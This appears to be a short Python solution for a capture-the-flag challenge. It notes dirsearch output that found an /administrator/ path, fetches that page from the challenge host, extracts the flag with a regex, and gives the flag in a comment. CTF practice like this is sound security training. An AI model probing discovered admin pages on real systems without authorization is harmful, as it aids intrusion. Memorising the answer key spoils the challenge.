import requests
import re

# dirsearch results
# [12:28:47] 200 -  755B  - /administrator/
# [12:28:47] 200 -  755B  - /administrator/index.php

BASE_URL_ADMIN = "http://gzcli.1pc.tf:40796/"
LOGIN_ENDPOINT = "administrator/index.php"

res = requests.get(BASE_URL_ADMIN + LOGIN_ENDPOINT)
print(res.text)

flag_format = "MBPTL-4{.*}"
flag = re.search(flag_format, res.text)[0]
print(flag)

# MBPTL-4{fe45bec5ee4d5bf8628e79e8267a19f1}